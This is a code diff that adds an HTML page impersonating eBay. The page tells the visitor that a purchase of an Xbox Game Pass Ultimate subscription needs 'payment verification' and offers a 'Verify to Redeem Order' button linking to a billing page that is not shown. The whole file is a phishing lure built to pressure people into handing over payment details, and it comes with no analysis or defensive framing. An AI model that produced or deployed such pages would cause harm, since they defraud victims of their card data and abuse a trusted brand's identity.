@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required - eBay</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: #f8f8f8;
+            line-height: 1.5;
+            color: #333;
+        }
+
+        .header {
+            background: #fff;
+            padding: 1.5rem;
+            border-bottom: 1px solid #e5e5e5;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            text-align: center;
+            animation: fadeIn 0.6s ease;
+        }
+
+        .logo {
+            height: 40px;
+            margin-bottom: 1rem;
+        }
+
+        .main-container {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            animation: fadeInUp 0.8s ease;
+        }
+
+        .verification-card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            overflow: hidden;
+        }
+
+        .verification-header {
+            background: #003087;
+            color: white;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .header-title {
+            font-size: 1.75rem;
+            margin-bottom: 1rem;
+            font-weight: 600;
+        }
+
+        .header-subtitle {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .verification-content {
+            padding: 2rem;
+        }
+
+        .order-summary {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        .product-image {
+            width: 140px;
+            height: 140px;
+            object-fit: cover;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .product-details {
+            flex: 1;
+        }
+
+        .product-name {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 0.5rem;
+        }
+
+        .order-info {
+            color: #666;
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+
+        .status-pending {
+            color: #dc2626;
+            font-weight: 600;
+        }
+
+        .security-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .security-item {
+            background: #fff;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 1.5rem;
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .security-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .security-icon {
+            font-size: 1.5rem;
+            color: #003087;
+            background: #f0f7ff;
+            padding: 0.5rem;
+            border-radius: 8px;
+        }
+
+        .security-text h3 {
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+            color: #2c3e50;
+        }
+
+        .security-text p {
+            color: #666;
+            font-size: 0.95rem;
+        }
+
+        .button-primary {
+            background: #0053a0;
+            color: white;
+            padding: 1.2rem 2rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            width: 100%;
+        }
+
+        .button-primary:hover {
+            background: #003d75;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,83,160,0.2);
+        }
+
+        .verification-notice {
+            text-align: center;
+            margin-top: 1.5rem;
+            color: #666;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 1rem;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+
+        .notice-icon {
+            color: #003087;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-container {
+                margin: 1rem auto;
+            }
+
+            .verification-content {
+                padding: 1.5rem;
+            }
+
+            .order-summary {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .security-features {
+                grid-template-columns: 1fr;
+            }
+
+            .header-title {
+                font-size: 1.5rem;
+            }
+
+            .header-subtitle {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="eBay Logo" class="logo">
+    </div>
+
+    <div class="main-container">
+        <div class="verification-card">
+            <div class="verification-header">
+                <h1 class="header-title">Verification Required</h1>
+                <p class="header-subtitle">Please verify your payment details to redeem your order</p>
+            </div>
+
+            <div class="verification-content">
+                <div class="order-summary">
+                    <img src="images/global.png" alt="Xbox Game Pass Ultimate" class="product-image">
+                    <div class="product-details">
+                        <h2 class="product-name">Xbox Game Pass Ultimate</h2>
+                        <div class="order-info">
+                            <p>1 Month Subscription</p>
+                            <p>Order ID: #286138331560</p>
+                            <p class="status-pending">Verification Required</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="security-features">
+                    <div class="security-item">
+                        <div class="security-icon">🛡️</div>
+                        <div class="security-text">
+                            <h3>Account Verification</h3>
+                            <p>Verify your payment method to access your digital product</p>
+                        </div>
+                    </div>
+                    <div class="security-item">
+                        <div class="security-icon">⚡</div>
+                        <div class="security-text">
+                            <h3>Quick Process</h3>
+                            <p>Complete verification in less than a minute to redeem your purchase</p>
+                        </div>
+                    </div>
+                    <div class="security-item">
+                        <div class="security-icon">🔒</div>
+                        <div class="security-text">
+                            <h3>Account Protection</h3>
+                            <p>Help us maintain the security of your eBay account and digital purchases</p>
+                        </div>
+                    </div>
+                </div>
+
+                <a href="billing.html" class="button-primary">Verify to Redeem Order</a>
+
+                <div class="verification-notice">
+                    <span class="notice-icon">ℹ️</span>
+                    <span>Verification is required to access your digital product</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
